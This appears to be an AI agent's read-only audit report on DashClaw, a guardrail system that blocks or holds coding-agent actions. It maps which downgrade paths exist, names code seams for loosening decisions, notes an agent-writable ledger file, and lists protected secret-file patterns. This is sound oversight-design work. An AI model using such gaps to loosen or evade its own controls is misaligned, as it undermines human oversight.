  - Evidence: `app/lib/policy-tuning/engine.ts:82-98 (TUNING_DEFAULTS: minFired 10, minResolved 5, raiseOverrideRate 0.9), 253-259 (explicit non-rule comment), 281-309 (risk_threshold-only actionable rule)`
- **(e, bonus mechanism the task didn't name but calibration.ts's own docblock defers to) app/lib/posture/loosening.ts is the actual system that reaches what policy-tuning cannot: protected_path, rate_limit, and action-type-envelope require_approval policies (TUNING_OWNED_POLICY_TYPES explicitly excludes risk_threshold at line 102, so the two engines partition the space). It proposes relax_policy_scope (carve one always-approved action_type out of a policy's envelope) or deactivate_policy, and unlike the calibration-vector system below, ratifying it applies the relaxation in the same request. But it uses the SAME reactive gate (minFired 10, minResolved 5) at an even STRICTER bar (95% override rate, 'these patches remove governance, not move a dial') and, being a mirror of the tuning engine, never produces evidence from block decisions either — approvals are the only fuel for either loosening engine, and a block generates none.**
  - Evidence: `app/lib/posture/loosening.ts:19-27 (LOOSENING_DEFAULTS, relaxOverrideRate 0.95), 100-102 (TUNING_OWNED_POLICY_TYPES excludes risk_threshold), 174-290 (deriveLooseningProposals); app/policies/lib/looseningClient.ts:5-6 ('POST ratify applies the relaxation in the same request')`
- **(f) Containment (allow_contained) is client-ready by default but server-dormant. hooks/dashclaw_pretool.py defaults HOOK_MODE to 'enforce' and CONTAINMENT_ENABLED to on (env var defaults '1'), so _attach_client_capabilities DOES send client_capabilities:['allow_contained'] for containable tools in a git repo out of the box. But the only way a policy can ever emit the allow_contained verdict is a risk_threshold rule with a rules.contain_above value set (app/lib/guard/policy.ts:268-281) — and grepping the whole app/ tree shows contain_above is never set by the catastrophe-only default pack, never set by any of the 8 curated policy-mode builders, and appears in zero policy-authoring UI components (only as a read-only tooltip in Ledger.tsx and prose in the /explain docs page). A human would have to hand-author raw policy JSON containing a field with no discoverable UI path to ever activate this — the client half being 'on' by default is a trap for anyone auditing only the hook.**
  - Evidence: `hooks/dashclaw_pretool.py:161 (HOOK_MODE default 'enforce'), 189 (CONTAINMENT_ENABLED default on), 1029-1050 (_attach_client_capabilities); app/lib/guard/policy.ts:268-281 (contain_above band); grep of app/ for contain_above: only app/lib/guard/policy.ts, types.ts, app/explain/sections.tsx (prose), and app/policies/components/Ledger.tsx:844 (display-only tooltip, no input control)`
- **(f) Even when eligible, containment is narrow-scope and defers rather than eliminates the click. isContainableAct only accepts act.kind==='file' or a shell act the evidence classifier grades 'apply' with zero risk flags and no git push/pull/fetch — this structurally excludes deploys, migrations, security-typed actions, and anything with a risk flag, i.e. exactly the class of actions producing the owner's risk-100 complaints. And a contained action still needs a later 'promotion' merge, which is UNCONDITIONALLY raised to require_approval regardless of grants or calibration (evaluate.ts checks context.action_type === 'containment_promote' and always raises, with no exception) — containment converts one interrupt into (silent execution + a still-required approval later), not into zero approvals.**
  - Evidence: `app/lib/guard/containment.ts:19-33 (isContainableAct eligibility, git-network exclusion), 86-104 (finalizeContainment downgrades ineligible/unadvertised verdicts to require_approval); app/lib/guard/evaluate.ts:1024-1033 (containment_promote always raises to require_approval, unconditional)`
- **(g) The actual clickable friction-reduction surface on /policies today lives in TriageInbox.tsx, which merges FIVE separate queues into one 'needs your call' list: warn-group verdicts (contractClient — one-click grant on recorded/warn actions), tuning proposals (proposalsClient, item e), tightening proposals (tighteningClient — the opposite direction, raises friction), loosening proposals (looseningClient, the bonus mechanism above), and calibration-vector proposals (calibrationClient — a DIFFERENT system than task item (a), see next finding). PresetsShields.tsx lets a human toggle 10 canned 'shield' policies on/off via PATCH, and ModeDrawer lets a human apply one of the 8 curated modes. Every one of these is either a static preset toggle or a reactive, evidence-gated proposal queue requiring accumulated interrupt history before it offers anything — none of them can act on an action the owner is asking for right now, for the first time.**
  - Evidence: `app/policies/components/TriageInbox.tsx:1-59 (five-queue merge, imports from contractClient/proposalsClient/tighteningClient/looseningClient/calibrationClient); app/policies/components/PresetsShields.tsx:44-80 (shield toggle via PATCH /api/policies); app/policies/components/PolicyWorkbench.tsx:10-14,129-170 (PostureHero/TriageInbox/PresetsShields/Ledger composition)`
- **SURPRISE/naming collision: there are two entirely separate systems called 'calibration' in this codebase. Task item (a) is app/lib/guard/calibration.ts, the interruption-THRESHOLD (theta) controller. A second, older, unrelated system at /api/calibration/proposals + app/lib/calibration-mining.js (owner roadmap v2.6b, predates v4.74.0) mines decision history for over_scored_benign / under_scored_danger / repeated_approvals patterns and proposes changes to RISK-SCORING VECTORS, not decisions. Its 'repeated_approvals' rule name is superficially the most on-point label for the owner's complaint of anything in the codebase, but it only affects future risk_score computation for a labeled shape (if and once a human both ratifies it AND separately marks it 'forged' with a vector_name via a second POST action) — it never touches the decision engine's allow/warn/require_approval/block logic directly, and 'needs_manual_context: !row.ratify_command' on many rows implies some proposals are incomplete without extra human judgment the UI doesn't supply.**
  - Evidence: `app/api/calibration/proposals/route.ts:28-51 (RULES set, statusOf), 305-322 (mark_forged action, separate from ratify); app/lib/calibration-mining.js (mineOverScoredBenign/mineUnderScoredDanger/mineRepeatedApprovals)`
- **SURPRISE: allow_contained (severity 2) ranks BELOW require_approval (severity 3) in the shared severity table, not above it as 'contained execution' might intuitively suggest — this is deliberate (contained-and-deferred is treated as less severe than a synchronous interrupt) but easy to misread when reasoning about the decision lattice.**
  - Evidence: `app/lib/guard/internal.ts:6 ('allow: 0, warn: 1, allow_contained: 2, require_approval: 3, block: 4')`
- **DECISIVE STRUCTURAL GAP: GuardEvalContext (the entire shape of what a guard evaluation can ever see) has no field carrying 'a human is asking for this right now' — confirmed by a full read, not just the pre-established fact: action_type, declared_action_type, agent_id/agent_name, risk_score, systems_touched, reversible, declared_goal, verification_status, replay_status, act/act_status/act_hash, intent_source (evidence-vs-declared, not human-vs-agent), target, write_paths, provider/cost fields, tool, intel.{branch,mcp,green,bash,file}, client_capabilities — none of these represent operator presence or real-time authorization. Given that, and given every relief mechanism (b-f) requires EITHER a matching row that already exists from a PRIOR interrupt (allow_grant policies pre-authored, operator_approval requiring a prior approved_by row within 15 min, plan grants requiring pre-submission+pre-review, loosening/tuning proposals requiring >=10 prior fired interruptions) OR narrow, unconfigured-by-default eligibility (containment), and given block decisions are categorically excluded from every single one of these mechanisms by explicit code checks (evaluate.ts:307,379,469/479/516,634-645) and by design ('blocks produce no approval evidence by design', policy-tuning/engine.ts:258) -- the system has zero channel through which the fact that the owner personally typed the instruction can lower a decision on its FIRST occurrence. Every mechanism shipped is retrospective (built from a history of prior interrupts) or requires the owner to have pre-declared the action out of band before the agent ever attempted it. Whether a given risk-100 action lands on 'block' (unapprovable, terminal) or 'require_approval' (approvable) is entirely a function of which policies happen to be active in his org -- e.g. SOC2 Mode and Research Mode ship with ZERO block-type policies (policy-modes/catalog.ts blocks:[] for both) so on those modes nothing ever blocks regardless of score, while risk_threshold:100 exists only in the catastrophe-only default, Claude Code Mode, and OpenClaw Mode. '100' is just the numeric clamp ceiling (risk.ts total is Math.min(...,100)); it is not a promise of any particular decision. The owner is not caught by a bug -- he is caught by a system whose only working lever for 'I already decided this' is 'wait for this exact shape to interrupt you >=10 times, then click accept on a proposal, and even then never for the actions currently reaching block.'**
  - Evidence: `app/lib/guard/types.ts:12-67 (GuardEvalContext, no intent-provenance field); app/lib/guard/evaluate.ts:307,379,469,479,516,634-645 (every downgrade path's block exclusion); app/lib/policy-tuning/engine.ts:253-259; app/lib/policy-modes/catalog.ts:192,218 (soc2 and research modes both have blocks: [])`

#### Key seams (insertion points)

- `app/lib/guard/types.ts:12 (GuardEvalContext) — where a bound, out-of-band human-presence/authorization field would need to be added; must NOT be a plain client-settable field per trust rule D1 (risk.ts:87-94,193-198 — client input may only raise, never lower)`
- `app/lib/guard/evaluate.ts:1051-1074 (the grant post-pass sequence: applyAllowGrants -> applyOperatorApprovalGrant -> applyPlanStepGrant) — the established, charter-compliant insertion point for any NEW downgrade mechanism; follow the same tighten-only/fail-closed/single-use pattern already proven here`
- `app/lib/guard/evaluate.ts:622-651 (runCalibrationController) — where the shipped-but-dormant ACI controller would need either a default-on decision or a real settings UI toggle to matter at all`
- `app/lib/posture/loosening.ts:100-102 (TUNING_OWNED_POLICY_TYPES) and app/lib/policy-tuning/engine.ts:253-259 — the exact lines that jointly guarantee no block-type policy can ever receive a loosening/tuning proposal; any redesign that wants humans to get evidence-based relief on block decisions (without ever auto-applying it) starts here`
- `app/lib/guard/policy.ts:260-283 (risk_threshold evaluator, contain_above band) plus app/lib/policy-modes/compile.ts MODE_BUILDERS — the seam to make containment reachable by default (curated modes could set contain_above; currently none do) and app/policies/components/PolicyRuleBuilderSection.tsx or PolicyAdvancedImportPanel.tsx would need an actual contain_above input control (currently absent)`
- `hooks/dashclaw_pretool.py:1029-1050 (_attach_client_capabilities) — already-live client-side seam for containment; any expansion of containment eligibility beyond file-scoped acts starts with _CONTAINABLE_TOOLS and isContainableAct (containment.ts:19-33) together`
- `app/api/plans/route.ts + app/lib/repositories/plans.repository.ts — the plan-authorization seam; extending it to auto-wrap a single ad hoc interactive request as a one-step plan (instead of requiring the agent to proactively plan ahead) would let it cover the owner's stated complaint directly`
- `app/policies/lib/settingsClient (does not currently exist) — no dedicated settings UI module surfaces CALIBRATION_CONTROLLER_MODE; app/settings/components/GovernancePanel.tsx is the closest existing settings surface and would be the natural place to add a toggle`

#### Surprises / contradictions

- The preflight-plan-authorization RFC (docs/rfcs/2026-07-06-preflight-plan-authorization.md:3) still says 'Status: PROPOSED', but the feature is fully implemented and live end-to-end (routes, repository with V2/U1-U3/W4 hardening markers, SDK method, /approvals UI cards) — stale documentation, not a missing feature. Worth a doc fix even though this task was read-only.
- Two unrelated systems are both named 'calibration': app/lib/guard/calibration.ts (task item a, the interruption-threshold ACI/e-process controller) and the older /api/calibration/proposals + app/lib/calibration-mining.js (roadmap v2.6b, risk-SCORING-vector proposals with an 'over_scored_benign / under_scored_danger / repeated_approvals' rule set and a separate ratify-then-'forge' two-step flow). The second one's 'repeated_approvals' rule name is the single most on-point label for the owner's complaint anywhere in the codebase, but it changes future risk scoring for a labeled shape, not decisions, and even then only after a second, separate 'mark forged' action.
- The mechanism structurally closest to actually answering the owner's complaint — app/lib/posture/loosening.ts, a 'loosening proposal' engine that ratifies AND applies a relaxation in one click for exactly the policy types (protected_path, rate_limit, action-type-envelope require_approval) that policy-tuning/engine.ts explicitly cannot touch — was not one of the seven items the task named, yet it is the exact system calibration.ts's own docblock says over-interruption evidence 'surfaces as' ('the existing human-ratified tuning/loosening proposal rails'). Investigating item (a) properly required finding it.
- allow_contained ranks BELOW require_approval in the severity lattice (internal.ts:6: allow=0, warn=1, allow_contained=2, require_approval=3, block=4) — counterintuitive at first glance since 'contained execution' sounds like it should be treated as riskier than a plain interrupt, not safer.
- Containment's client-side wiring is genuinely on by default (HOOK_MODE=enforce, CONTAINMENT_ENABLED=1 in hooks/dashclaw_pretool.py) while its server-side trigger (contain_above on a risk_threshold policy) is configured in zero shipped defaults, zero curated modes, and has no authoring UI field anywhere — an audit that only reads the hook would wrongly conclude containment is live in practice.

---

### aae85a8cf6aec74a6

#### Findings

- **The local dev DB (dashclaw-db-1, port 5433) WAS reachable this session. Docker Desktop was down at task start (docker CLI + port 5433 both failed); starting Docker Desktop brought the already-configured container back up automatically within seconds, and a read-only session (SET SESSION CHARACTERISTICS AS TRANSACTION READ ONLY, single pooled connection) ran all queries with zero writes.**
  - Evidence: `docker ps -a output: 'dashclaw-db-1  Up 23 seconds  0.0.0.0:5433->5432/tcp'; script output '== session is READ ONLY =='`
- **guard_decisions holds only 112 rows total, spanning 2026-08-07 21:46 to 2026-08-11 17:18 (~4 days) across 2 orgs — all-time counts equal last-30-day counts because every row is inside the 30-day window.**
  - Evidence: `query output: guard_decisions: 112; created_at range {min_ts: '2026-08-07 21:46:00.228', max_ts: '2026-08-11 17:18:58.392'}; distinct orgs: 2`
- **Decision distribution in the local DB is allow=111, require_approval=1, warn=0, block=0 (all-time == last-30d). warn and block have literally never fired in this database's history.**
  - Evidence: `01_report.mjs section 1 output: [{decision:'allow', all_time:111, last_30d:111},{decision:'require_approval', all_time:1, last_30d:1}] — 'block' and 'warn' rows absent from the GROUP BY entirely`
- **The single require_approval event: agent_id 'plain-lang-verify' (a verification/test agent, not an ordinary coding session), action_type file_write, declared_goal 'Write: .env', fired via policy_type protected_path (hold_secret_file_writes) matching the literal path '.env' — NOT via a risk-score threshold. Its risk_score (75) came from client_reported=75 overriding server_total=35 via the max() fold.**
  - Evidence: `02_deepdive.mjs section A: reason 'Catastrophe Pack — Hold Secret-File Writes for Approval: Protected path touched: .env', matched_policies '["gp_f4d45005f78d4706ae7a4415"]', risk_breakdown {server_total:35, client_reported:75, final:75, modifiers:[{delta:15, factor:'goal:secret-pattern'}]}`
- **risk_score = 100 has NEVER occurred in this local DB, in either guard_decisions or action_records, ever. Nor has decision='block'. The maximum risk_score seen anywhere is 90 (one allow).**
  - Evidence: `02_deepdive.mjs section D (action_records risk_score values: only 20 and 10) and section E (guard_decisions risk_score values: 10,20,40,60,75,80,85,90 — no 100 present)`
- **Zero action_records rows in this DB are linked to any guard_decisions row (guard_decision_id populated on 0 of 58), zero have ever had approved_by set, and zero have ever held status='pending_approval'. The approval-rate query (approved / (approved+denied)) is undefined (0/0), not a real percentage.**
  - Evidence: `02_deepdive.mjs section C: {ever_approved:0, ever_pending_approval:0, ever_deny_message:0, ever_guard_linked:0, total_action_records:58}; 01_report.mjs sections 3b/4a/4b returned zero rows; section 8 approval_rate_pct: null`
- **All 58 action_records rows are synthetic/demo content generated for marketing/docs purposes ('the platform guide', competitor-pricing summaries), not real day-to-day coding-agent governance traffic.**
  - Evidence: `02_deepdive.mjs section F declared_goal shapes: 'Verify assumption flow for the platform guide' (14), 'Record a real example action for the platform guide' (14), 'Summarize competitor pricing pages' (10), 'Record a governed docs update' (10), 'Recorded example: building the DashClaw interactive platform guide' (10)`
- **87% of guard_decisions (97/112) belong to an org whose 'name' column literally equals its own generated id (org_5979f05b-c7ce-440f-8a1d-c9b1bcb68cfd) — the signature of an auto-provisioned test/demo org, never given a human display name, rather than Wes's real working org.**
  - Evidence: `01_report.mjs section 9/9b: org_5979f05b... row has name === id; org_default (Wes's real org, 'Default Organization') accounts for only 15 of 112 guard_decisions`
- **CONCLUSION on the DB path: reachable but not usable to answer the owner's complaint — too sparse (4 days), too synthetic (demo/marketing content, an auto-test org), and contains none of the risk-100 events described. Falling back to the calibration golden-vector corpus (the task's own contingency for an unusable DB) even though the connection itself succeeded.**
  - Evidence: `combination of findings 2,5,6,7,8 above — every angle queried came back empty or negative for the complained-about pattern`
- **The golden-vector corpus (__tests__/fixtures/risk-calibration-golden-vectors.json, 33 vectors) contains 8 vectors explicitly sourced from real, dated maintainer sessions or mined real action history, and ALL 8 are labeled benign — i.e. every documented live incident in this corpus was a false positive on a safe, routine command scored at or near the block ceiling.**
  - Evidence: `vectors: git-show-format-flag ('2026-07-01 session: maintainer blocked at risk 100' on read-only `git show --format=`), powershell-get-content-tail ('2026-07-02 session: maintainer blocked at risk 100' on read-only Get-Content -Tail), powershell-remove-item-single-file ('blocked at 100' for one temp file), rmdir-empty-dir ('wrong self-block... scored 100' on an empty dir), powershell-remove-item-recurse-false ('wrong self-block... scored 100' despite -Recurse:$false), rm-rf-next-build-cache ('2026-07-03 maintainer session: pretool hook hard-blocked rm -rf .next at risk 100' during routine Turbopack cleanup), cd-chain-grep (mined cv_4d6f975b6c05aaec: 11x completed at risk 70), npx-vitest-run (mined cv_5b6c1d705d442d76: 15x completed at risk 70) — all label:'benign' in the fixture`
- **The named root cause for these false positives is a client-side (hook) mechanism, not the server's risk math: an unrecognized Bash/PowerShell command classifies as 'unknown' and the pretool hook substitutes a blunt constant of 70 (RISK_HIGH_MIN) for the real score, and/or naive substring matching flags benign flags or prose (--format= matches \bformat\b; '-Recurse:$false' matches the '-rec' substring as if it meant recursion).**
  - Evidence: `hooks/dashclaw_agent_intel/bash_classifier.py:79-82 ('they fall through to "unknown", and the pretool hook replaces the classifier score with the Bash tool's blunt base risk (70 = RISK_HIGH_MIN)'); bash_classifier.py:378-380 ('previous max(base_risk, score) pinned EVERY bash call to the 70 base'); bash_classifier.py:462 ('PowerShell call fell to the blunt execution base (70)'); fixture source strings for git-show-format-flag and powershell-remove-item-recurse-false`
- **Because trust rule D1 folds client-reported and server-computed risk via max() (client can only RAISE, never lower), a client-side misfire becomes the FINAL effective score no matter how well-calibrated the server's own action-type math is — the two mined incidents (11x and 15x) prove this isn't hypothetical, it's a repeating pattern that fired on every single occurrence.**
  - Evidence: `app/lib/guard/risk.ts:87-94,193-198 (max() fold, already established); cd-chain-grep and npx-vitest-run vectors' source fields citing exact repeat counts '11x completed' / '15x completed', both 'at risk 70'`
- **Under Wes's own currently-active default pack (catastrophe-only — confirmed auto-seeded at org birth, and confirmed literally the pack that fired in the DB's one real event), risk_score >= 100 maps ONLY to policy block_mass_destructive with a hardcoded action: block (no require_approval path exists for a pure risk-threshold hit). Blocks are absolute / no self-approval per MAINTAINER.md.**
  - Evidence: `app/lib/guardrails/packs/catastrophe-only/policies.yml:16-21 ('rules: threshold: 100 / action: block'); catastrophe-only-pack.test.js:32-43 asserts exactly this; app/lib/setup/catastrophe-pack.mjs is called 'at org birth' by scripts/auto-migrate.mjs per catastrophe-pack-seed.test.js header comment`
- **hold_secret_file_writes (the ONLY require_approval-producing rule in the default pack) is a protected_path match, completely independent of risk_score magnitude — it fires purely on filename pattern (.env, .pem, id_rsa*, secrets/**, etc.), so 'risk score 100' cannot be the reason a require_approval event exists under this pack.**
  - Evidence: `app/lib/guardrails/packs/catastrophe-only/policies.yml:42-54 (policy_type: protected_path, rules.action: require_approval, matched by path glob, no risk_score field in rules at all)`
- **risk_threshold policy_type's action is configurable per-policy (rules.action || 'block'), so a DIFFERENT installed pack (6 others exist: claude-code-starter, development, enterprise-strict, layered-intelligence, smb-safe, startup-growth) could plausibly map a near-100 risk score to require_approval instead of block — meaning the owner's literal wording is consistent with a stricter/older pack he has run, even though it doesn't match catastrophe-only, his current default.**
  - Evidence: `app/lib/guard/policy.ts:260-266 ('const threshold = rules.threshold ?? 80; ... return { action: rules.action || 'block', ... }'); app/lib/demo/fixtures/guard-fixtures.ts:44-52 shows a demo risk_threshold policy at threshold:75; app/lib/guardrails/packs/ directory listing shows 7 packs total`
- **Approval RATE (fraction of require_approval prompts a human actually clicked Approve on) is NOT MEASURED anywhere in the read-only-accessible data — the local DB has 0 resolved require_approval events (0/0) and the golden-vector corpus is a risk-score calibration fixture, not an approval-outcome log. What IS measured with hard numbers is a false-positive rate: 8/8 (100%) of the corpus's real-session/mined-sourced incidents were confirmed false positives on safe commands.**
  - Evidence: `01_report.mjs section 8 output: approval_rate_pct: null (division by zero, both numerator and denominator 0); finding above re: 8/8 benign-labeled sourced vectors`

#### Key seams (insertion points)

- `app/lib/guard/risk.ts:87-94 — computeEffectiveRisk's max(client, server, template) fold; the seam where a purely client-derived, uncorroborated score could be capped below block-eligibility instead of being trusted at face value`
- `app/lib/guard/policy.ts:260-266 — risk_threshold evaluator; 'rules.action || "block"' is where block-vs-require_approval is decided per policy, and where score-provenance (client-only vs server-corroborated) could gate which action a threshold hit is allowed to reach`
- `app/lib/guardrails/packs/catastrophe-only/policies.yml:16-34 — block_mass_destructive; the exact rule producing hard blocks at risk>=100 under the shipped default pack`
- `hooks/dashclaw_agent_intel/bash_classifier.py:79-87 — INTERPRETER_COMMANDS allowlist; the editable seam where adding a recognized command name removes it from the blunt 70-fallback path (this is literally how npx/node were fixed previously)`
- `hooks/dashclaw_agent_intel/bash_classifier.py:378-382 — comment documenting the historical 'max(base_risk, score) pinned EVERY bash call to 70' bug and its partial fix (still applies to any command the classifier can't parse)`
- `app/lib/guard/evaluate.ts:378-410 (applyOperatorApprovalGrant) — the existing precedent for a post-pass downgrade seam (agent_id + exact declared_goal + action_type, single-use); a new 'known-safe command class' downgrade could follow the same pattern`
- `__tests__/fixtures/risk-calibration-golden-vectors.json — the corpus itself; the natural place to keep pinning new false-positive incidents and to build a 'would this vector interrupt under pack X' regression harness before shipping any calibration change`

#### Surprises / contradictions

- The local dev DB does NOT corroborate the complaint at all: 111/112 decisions are 'allow', 0 are 'block', only 1 is 'require_approval' (risk_score 75, not 100), and risk_score=100 has never occurred in the DB's history. If this DB were the only evidence, the conclusion would be 'there is no problem' — the opposite of the owner's lived experience.
- Zero action_records rows are linked to a guard_decisions row, and zero have ever had approved_by set or ever sat in pending_approval — this DB has literally never recorded a human clicking Approve or Deny, ever. All 58 action_records rows are demo/marketing-generation content ('the platform guide', competitor pricing), not real governed coding-agent work.
- The owner's literal phrase 'approving commands...that are risk score 100' is not achievable under his own currently-active default pack: risk>=100 maps only to a hardcoded block (block_mass_destructive), and blocks are absolute / no self-approval per MAINTAINER.md. There is no code path today where a pure risk-100 event becomes something a human can click Approve on — the complaint's mechanics point either to a different/older pack or to 'approving' being used loosely to mean 'having to stop and deal with the interruption', not a literal Approve click.
- The real, well-evidenced pain trail lives in a completely different place than the task brief pointed: the risk-calibration golden-vector fixture, where 8 of 8 named real-session/mined incidents are confirmed false positives (git show --format, Get-Content -Tail, single-file delete, empty-dir rmdir, a correctly-non-recursive PowerShell delete, rm -rf .next, and two mined patterns that fired wrong 11x and 15x respectively: cd-prefixed chains and npx test runs). This is a client-side (hook) classifier defect — a blunt 'unknown command -> 70' fallback plus naive substring regex matches — not a server risk-model or policy-threshold miscalibration.
- 87% of the local DB's guard_decisions belong to an org whose name equals its own generated UUID-style id — an unmistakable auto-provisioned test/demo org, not Wes's real workspace — meaning even the sparse data that exists is mostly not representative of his actual usage.
- Because client-reported risk can only RAISE the effective score (max() fold, trust rule D1), the classifier's blunt-70 fallback bug doesn't just mis-score one call — it becomes the FINAL, unappealable score for every command that hits it, and the two mined vectors prove this repeated identically 11 and 15 times respectively rather than being a one-off.

---

### ac94b6c4bc329659c

#### Findings

- **Claude Code's full hook-event roster (per the claude-code-capability-primer:claude-code-hooks skill, loaded and read this session) includes UserPromptSubmit, UserPromptExpansion, Stop, StopFailure, SessionStart, SessionEnd, PreToolUse, PermissionRequest, PermissionDenied, PostToolUse, PostToolUseFailure, PostToolBatch, FileChanged, CwdChanged, ConfigChange, InstructionsLoaded, Notification, MessageDisplay, SubagentStart, SubagentStop, TaskCreated, TaskCompleted, Setup, PreCompact, PostCompact, Elicitation, ElicitationResult, WorktreeCreate, WorktreeRemove, TeammateIdle.**
  - Evidence: `Skill content returned by Skill(claude-code-capability-primer:claude-code-hooks), section 'Event Types'. This is a third-party capability primer, not Anthropic's own doc, so field-level details below were independently cross-checked against live local hook code where possible.`
- **UserPromptSubmit's payload carries the human's literal typed text under the field name data.prompt, delivered before the agent acts on it that turn -- verified against a live, currently-wired hook on this exact machine, not just the primer.**
  - Evidence: `C:/Users/sandm/.claude/hooks/scope-lock.cjs:67-68 -- `if (data.hook_event_name === 'UserPromptSubmit') { const prompt = String(data.prompt || '').trim();` -- registered in C:/Users/sandm/.claude/settings.json:175-195 under UserPromptSubmit, matcher-less (fires every prompt).`
- **DashClaw wires exactly four Claude Code hook events -- PreToolUse, PostToolUse, Stop, SessionStart -- across every one of its Claude Code hook-config sources. UserPromptSubmit, Notification, SessionEnd, PreCompact, and SubagentStop are not wired anywhere for Claude Code.**
  - Evidence: `C:/Projects/DashClaw/hooks/settings.json:1-48 (shipped template); C:/Projects/DashClaw/plugins/dashclaw/hooks/hooks.json:1-49 (plugin mirror); C:/Users/sandm/.claude/settings.json:106,130,140,159 (this machine's live, active config) -- all three show the identical 4-event set.`
- **Claude Code's common hook-input schema (per the primer) includes permission_mode (values: default, plan, acceptEdits, auto, dontAsk, bypassPermissions) and transcript_path on every hook invocation -- but dashclaw_pretool.py, the script that actually makes the allow/warn/block/require_approval decision, reads neither field.**
  - Evidence: `Skill 'Common Input (JSON stdin)' section lists permission_mode and transcript_path as common to all hooks. C:/Projects/DashClaw/hooks/dashclaw_pretool.py:1814-1829 (main()) reads only tool_name, tool_input, tool_use_id, session_id, cwd, agent_id/agent_type -- confirmed by a repo-wide grep for 'permission_mode' (zero matches in C:/Projects/DashClaw) and for 'transcript_path' within dashclaw_pretool.py specifically (zero matches).`
- **A real, local, out-of-band (harness-authored, not agent-authored) record of the human's literal typed words already exists on disk and is already opened by DashClaw code today -- the Claude Code JSONL transcript at transcript_path, read by the Stop hook -- but DashClaw discards the human content and keeps only boundary indices, token counts, and the agent's own assistant text.**
  - Evidence: `C:/Projects/DashClaw/hooks/dashclaw_stop.py:636 reads `transcript_path = data.get('transcript_path') or ''` and loads it via load_entries. hooks/dashclaw_agent_intel/stop_transcript.py:42-64 (index_after_last_user_prompt) inspects `{'type':'user','message':{'content': str-or-list}}` entries only to return an integer slice boundary, never the string. DashClaw's own test fixture proves the exact entry shape it models: hooks/tests/test_stop_transcript.py:10-11 -- `_user(text='hi', uuid='u1')` -> `{'type': 'user', 'uuid': uuid, 'message': {'content': text}}`. turn_assistant_text (stop_transcript.py:180-193) then extracts ASSISTANT (agent) text only for assumption/deviation capture -- the human's words are never pulled out anywhere in the pipeline.`
- **The PreToolUse hook (the one that actually renders the allow/warn/block/require_approval decision) never reads transcript_path at all, so even if DashClaw started capturing the human's transcript text, today's architecture has no live path for that content to reach the decision that governs the CURRENT tool call within the SAME turn -- only a later turn's decision could see it, via a persisted read.**
  - Evidence: `Confirmed by the same C:/Projects/DashClaw/hooks/dashclaw_pretool.py:1814-1829 stdin-read absence of transcript_path noted above; transcript_path is read only in dashclaw_stop.py, which fires after the turn already completed.`
- **session_tracker.py's SessionTracker class -- described in hooks/README.md as part of the shipped v2 intelligence module, feeding a 'session' intel dict (cumulative_risk, failure_count, branch) into every guard request -- is not actually imported or used by dashclaw_pretool.py. It is an in-memory-only lifecycle-status state machine (spawning/ready/running/blocked/finished/failed) with no human-content field and no disk-persistence method, and appears to be dead or unshipped relative to its own documentation.**
  - Evidence: `C:/Projects/DashClaw/hooks/dashclaw_pretool.py:117 imports exactly `classify_bash, scan_file_operation, classify_tool, McpHealthMonitor` from dashclaw_agent_intel -- SessionTracker is absent. Repo-wide search shows SessionTracker/session_tracker referenced only in hooks/dashclaw_agent_intel/session_tracker.py itself, hooks/dashclaw_agent_intel/__init__.py (module export), and its own tests (test_session_tracker.py, test_full_integration.py). The strings 'cumulative_risk' and 'failure_count' (hooks/README.md:14, 63) do not appear anywhere in dashclaw_pretool.py.`
- **written_paths_ledger.py is a script-then-execute composition detector, not a human-intent signal -- it records which file paths THIS SESSION wrote (via PostToolUse) into a per-session temp-file ledger keyed by session_id, so a later Bash/PowerShell execute of that same path gets content-graded. Its state is a predictable path in the OS temp dir that the governed agent itself could also write to.**
  - Evidence: `C:/Projects/DashClaw/hooks/dashclaw_agent_intel/written_paths_ledger.py:84-92 (ledger_path) builds `tempfile.gettempdir() + 'dashclaw_written_paths_' + instance_suffix + '_' + session_id + '.json'` -- session_id is a value the same hook process already trusts elsewhere, and instance_suffix is a deterministic hash of (BASE_URL|AGENT_ID) computed identically in dashclaw_pretool.py:160, so nothing about the filename is secret from the agent's own OS user.`
- **No TTY / interactive-vs-headless / print-mode signal exists anywhere in DashClaw's code today.**
  - Evidence: `grep for CLAUDECODE, CLAUDE_CODE_ENTRYPOINT, isatty across C:/Projects/DashClaw/hooks, C:/Projects/DashClaw/app/lib/guard, C:/Projects/DashClaw/cli returned zero matches.`
- **Claude Code's Notification hook event documents matcher types including idle_prompt, permission_prompt, auth_success, elicitation_dialog/complete/response -- idle_prompt in particular is the most direct-sounding native candidate for 'the harness detected the human is no longer present,' but it is completely unwired by DashClaw and unverified beyond the third-party primer (no local script consumes Notification to confirm its real payload shape).**
  - Evidence: `Skill 'Matcher Syntax' section: 'Notification matchers -- permission_prompt, idle_prompt, auth_success, elicitation_dialog, elicitation_complete, elicitation_response.' Repo-wide search for a registered 'Notification' hook event in any DashClaw settings.json/hooks.json returns zero hits.`
- **enforcement_liveness_probe.py is explicitly NOT a human-attendance signal -- it proves the PreToolUse ENFORCEMENT SEAM itself still fires and blocks (guarding against a repeat of the v4.72.1 incident where an overflowed hook timeout silently fail-opened every block), verdicted by whether a synthetic marker-file write executed. The term 'liveness' is already claimed by this different concept in this codebase.**
  - Evidence: `C:/Projects/DashClaw/hooks/enforcement_liveness_probe.py:1-38 docstring: 'Verdicts: held / executed / unprovable' based on whether a synthetic Write executed after an exit-2 probe -- never based on any signal of human presence.`
- **DashClaw has its own, unrelated 'PERMISSION_MODE' concept -- DASHCLAW_PERMISSION_MODE, an env var defaulting to the literal string 'danger' -- that governs bash-command workspace read/write scope classification, not attendance. This is a real naming collision with Claude Code's native permission_mode hook-payload field and could mislead a redesign into thinking an attendance-adjacent signal is already wired when it is not.**
  - Evidence: `C:/Projects/DashClaw/hooks/dashclaw_pretool.py:163 -- `PERMISSION_MODE = os.environ.get('DASHCLAW_PERMISSION_MODE') or 'danger'` -- consumed only at dashclaw_pretool.py:465 (`classify_bash(command, mode=PERMISSION_MODE, ...)`); hooks/dashclaw_agent_intel/bash_classifier.py:862-871 documents classify_bash's mode parameter as one of 'readonly', 'workspace_write', 'full_access' -- note the default env value 'danger' matches none of the three named cases.`
- **No signal exists for 'time since the human last typed something.' It is derivable two ways, neither built: hooking UserPromptSubmit and persisting a last-seen timestamp (not done -- UserPromptSubmit isn't hooked at all), or reading transcript_path at PreToolUse time and finding the most recent real user-prompt entry (technique already proven in stop_transcript.py, but PreToolUse never reads transcript_path, and DashClaw's own transcript-entry test fixtures carry no wall-clock timestamp field, so whether real transcript entries even have one is unverified from this codebase).**
  - Evidence: `hooks/tests/test_stop_transcript.py:10-35 (_user, _assistant fixture builders) contain no 'timestamp' key; repo-wide grep for a timestamp field read off transcript entries in hooks/ returns no real usage.`
